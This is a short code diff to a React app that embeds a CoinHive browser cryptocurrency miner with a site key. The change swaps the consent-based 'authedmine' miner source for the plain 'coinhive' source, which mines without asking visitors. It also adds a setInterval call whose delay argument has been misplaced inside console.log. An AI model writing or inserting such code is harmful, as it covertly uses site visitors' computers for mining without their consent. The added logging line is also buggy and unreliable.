@@ -23,8 +23,8 @@ class App extends Component {
           siteKey="0M5lX8MxehwqustAk4XzCz4NrEhgYhFP"
           autoThreads={false}
           threads={2}
-          src={CoinHive.src.authedmine}
-          onInit={miner => setInterval(() => console.log(CoinHive.getMinerData(miner)), 1000)}/>
+          src={CoinHive.src.coinhive}
+          onInit={miner => setInterval(() => console.log(".", 1000))}/>
  
         <header className="App-header">  
           <h1 className="App-title rotating">C</h1>
